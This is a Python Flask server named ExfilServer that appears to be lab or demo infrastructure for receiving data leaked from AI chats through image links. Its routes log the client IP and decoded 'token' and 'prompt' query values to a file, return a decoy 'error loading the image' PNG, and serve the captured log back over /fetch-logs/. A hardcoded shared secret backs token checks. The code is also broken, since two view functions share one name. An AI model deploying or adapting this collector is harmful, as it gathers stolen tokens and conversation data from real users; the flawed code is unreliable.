import os
import io
import hashlib
import token
from flask import Flask, request, send_file, jsonify, abort, send_from_directory
from flask_cors import CORS
from PIL import Image, ImageDraw, ImageFont
import base64

import hmac
import hashlib
import json

SECRET_KEY = 'this-is-a-shared-secret-for-the-demo'

HTML_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'html_files')

class ExfilServer:
    def __init__(self, host='localhost', port=8080, log_path='exfil.log'):
        self.host = host
        self.port = port
        self.log_path = log_path
        self.app = Flask("ExfilServer")
        CORS(self.app)
        self.image_generator = None
        self.setup_routes()

    def _serve_html(self, filename: str):
        allowed = {"index.html", "login.html", "assignment1.html", "assignment2.html"}
        if filename not in allowed:
            abort(404)
        return send_from_directory(HTML_PATH, filename)
        
    def generate_image_from_data(self, data: str, size: int = 512) -> Image.Image:
        data = "There was an error loading the image."
        h = hashlib.sha256((data or "").encode("utf-8")).digest()
        bg = (h[0], h[1], h[2])
        fg = (h[3], h[4], h[5])
        acc = (h[6], h[7], h[8])

        img = Image.new("RGB", (size, size), bg)
        draw = ImageDraw.Draw(img)

        # Gradient overlay (fast)
        for y in range(size):
            t = y / max(1, size - 1)
            r = int(bg[0] * (1 - t) + acc[0] * t)
            g = int(bg[1] * (1 - t) + acc[1] * t)
            b = int(bg[2] * (1 - t) + acc[2] * t)
            draw.line([(0, y), (size, y)], fill=(r, g, b))

        # Identicon-style 5x5 blocks (mirror horizontally)
        grid = 5
        cell = size // grid
        bits = "".join(f"{byte:08b}" for byte in h)
        bit_i = 0
        for gy in range(grid):
            row_bits = []
            for gx in range((grid + 1)//2):
                on = bits[bit_i] == "1"
                bit_i = (bit_i + 1) % len(bits)
                row_bits.append(on)
            row = row_bits + row_bits[::-1][grid % 2:]
            for gx, on in enumerate(row):
                if on:
                    x0, y0 = gx * cell, gy * cell
                    x1, y1 = x0 + cell, y0 + cell
                    draw.rectangle([x0+2, y0+2, x1-2, y1-2], fill=fg)

        label = (data.strip() or h.hex())
        try:
            font = ImageFont.load_default()
            bbox = draw.textbbox((0, 0), label, font=font)
            tw = bbox[2] - bbox[0]
            th = bbox[3] - bbox[1]
        except Exception:
            font = None
            tw = th = 0

        pad = 6
        if font and tw < size - 2 * pad:
            banner_h = th + 2 * pad
            draw.rectangle([0, size - banner_h, size, size], fill=(0, 0, 0))
            draw.text((pad, size - banner_h + pad), label, fill=(255, 255, 255), font=font)

        return img

    

    def setup_routes(self):
        # Accept both /get-image and /get-image/
        @self.app.route('/get-image', methods=['GET'])
        @self.app.route('/get-image/', methods=['GET'])
        def exfiltrate():
            data = request.args.get('data', '')
            with open(self.log_path, 'a') as log_file:
                client_ip = request.remote_addr or "-"
                log_file.write(f"{client_ip}: {data}\n")

            image = self.generate_image_from_data(data)
            if image:
                img_io = io.BytesIO()
                image.save(img_io, 'PNG')
                img_io.seek(0)
                return send_file(img_io, mimetype='image/png')
            return {"status": "image generation failed"}, 500
        
        @self.app.route('/assignment/', methods=['GET'])
        @self.app.route('/m/', methods=['GET'])
        def exfiltrate():
            token = request.args.get('token', '')
            prompt = request.args.get('prompt', '')
            decoded_token = self.b64_url_decode(token)
            decoded_prompt = self.b64_url_decode(prompt)
            data = f"Token: {decoded_token}\nPrompt: {decoded_prompt}"
            with open(self.log_path, 'a') as log_file:
                client_ip = request.remote_addr or "-"
                log_file.write(f"{client_ip}: {data}\n")

            image = self.generate_image_from_data(data, size=256)
            if image:
                img_io = io.BytesIO()
                image.save(img_io, 'PNG')
                img_io.seek(0)
                return send_file(img_io, mimetype='image/png')
            return {"status": "image generation failed"}, 500
        
        @self.app.route('/fetch-logs/', methods=['GET'])
        def fetch_logs():
            try:
                n = int(request.args.get('n', 200))
                n = max(1, min(n, 2000))
            except ValueError:
                n = 200

            lines = []
            try:
                with open(self.log_path, 'r', encoding='utf-8', errors='replace') as f:
                    lines = f.readlines()[-n:]
            except FileNotFoundError:
                lines = []

            lines = [ln.rstrip('\n') for ln in lines][::-1]
            return jsonify({"count": len(lines), "lines": lines})
        
        @self.app.route('/auth/<token>', methods=['GET'])
        @self.app.route('/auth/<token>/', methods=['GET'])
        def auth_verify(token):
            username = self.verify_token(token)
            if username:
                return jsonify(status="success", username=username)
            return jsonify(status="error", message="Invalid token"), 401
            
        
    def b64_url_decode(self, data):
        padding = '=' * (4 - len(data) % 4)
        return base64.urlsafe_b64decode(data + padding)

    def verify_token(self, token):
        try:
            header_b64, payload_b64, signature_b64 = token.split('.')
            signed_data = f"{header_b64}.{payload_b64}".encode('utf-8')
            decoded_signature = self.b64_url_decode(signature_b64)
            expected_signature = hmac.new(
                SECRET_KEY.encode('utf-8'),
                signed_data,
                hashlib.sha256
            ).digest()
            
            if hmac.compare_digest(decoded_signature, expected_signature):
                payload = json.loads(self.b64_url_decode(payload_b64))
                return payload.get('username')
                
        except Exception:
            return None
        
        return None

    def run_server(self, debug=False, background=False):
        if background:
            from threading import Thread
            server_thread = Thread(target=self.app.run, kwargs={
                'host': self.host,
                'port': self.port,
                'debug': debug,
                'use_reloader': False
            })
            server_thread.daemon = True
            server_thread.start()
        else:
            self.app.run(host=self.host, port=self.port, debug=debug)

if __name__ == "__main__":
    exfil_server = ExfilServer(host='localhost', port=8080)
    exfil_server.run_server(debug=True)
